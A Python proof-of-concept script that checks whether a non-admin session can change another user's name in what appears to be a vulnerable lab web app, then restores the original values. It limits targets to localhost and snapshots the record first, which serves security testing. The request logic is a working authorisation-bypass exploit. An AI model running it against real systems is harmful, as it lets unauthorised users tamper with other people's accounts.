#!/usr/bin/env python3
"""AUTH-001 E: non-admin update of an arbitrary user, with snapshot and restore."""

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def build_url(base, path):
    parsed = urllib.parse.urlparse(base)
    if parsed.scheme not in ("http", "https"):
        raise SystemExit("refuse: scheme must be http or https")
    host = (parsed.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        raise SystemExit("refuse: host must be localhost/127.0.0.1/::1")
    return urllib.parse.urljoin(base.rstrip("/") + "/", path.lstrip("/"))


def request(url, cookie, timeout, payload=None):
    data = None
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    req.add_header("Cookie", cookie)
    req.add_header("Accept", "application/json")
    if data is not None:
        req.add_header("Content-Type", "application/json")
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        raise SystemExit("connection_error: {}".format(exc.reason))


def find_user(body, target_id):
    try:
        rows = json.loads(body)
    except ValueError:
        return None
    if not isinstance(rows, list):
        return None
    for row in rows:
        if isinstance(row, dict) and str(row.get("user_id")) == str(target_id):
            return row
    return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", required=True)
    parser.add_argument("--cookie-file", required=True,
                        help="file holding only the low-privilege session cookie")
    parser.add_argument("--target-id", required=True, type=int,
                        help="user_id of a dedicated test record, not the admin account")
    parser.add_argument("--marker", default="AUTH001-POC")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()
    with open(args.cookie_file, "r", encoding="utf-8") as fh:
        session = fh.read().strip()
    if not session:
        raise SystemExit("cookie file is empty")
    cookie = session + "; security=low"
    list_url = build_url(args.base, "get_user_data.php")
    update_url = build_url(args.base, "change_user_details.php")

    status, body = request(list_url, cookie, args.timeout)
    before = find_user(body, args.target_id)
    if before is None:
        print("precheck_failed: target not found, status={}".format(status))
        return 2
    original_first = before.get("first_name")
    original_surname = before.get("surname")
    print("snapshot:", json.dumps({"user_id": args.target_id,
                                   "first_name": original_first,
                                   "surname": original_surname}))

    payload = {"id": args.target_id,
               "first_name": args.marker + "-F",
               "surname": args.marker + "-S"}
    status, body = request(update_url, cookie, args.timeout, payload=payload)
    print("update_status={} body={}".format(status, body[:300]))

    status, body = request(list_url, cookie, args.timeout)
    after = find_user(body, args.target_id)
    print("after_update:", json.dumps(after, ensure_ascii=False))
    changed = (after is not None
               and after.get("first_name") == payload["first_name"]
               and after.get("surname") == payload["surname"])
    print("change_observed:", changed)

    restore = {"id": args.target_id,
               "first_name": original_first,
               "surname": original_surname}
    status, body = request(update_url, cookie, args.timeout, payload=restore)
    print("restore_status={} body={}".format(status, body[:300]))

    status, body = request(list_url, cookie, args.timeout)
    restored = find_user(body, args.target_id)
    print("after_restore:", json.dumps(restored, ensure_ascii=False))
    ok = (restored is not None
          and restored.get("first_name") == original_first
          and restored.get("surname") == original_surname)
    print("restore_ok:", ok)
    return 0


if __name__ == "__main__":
    sys.exit(main())
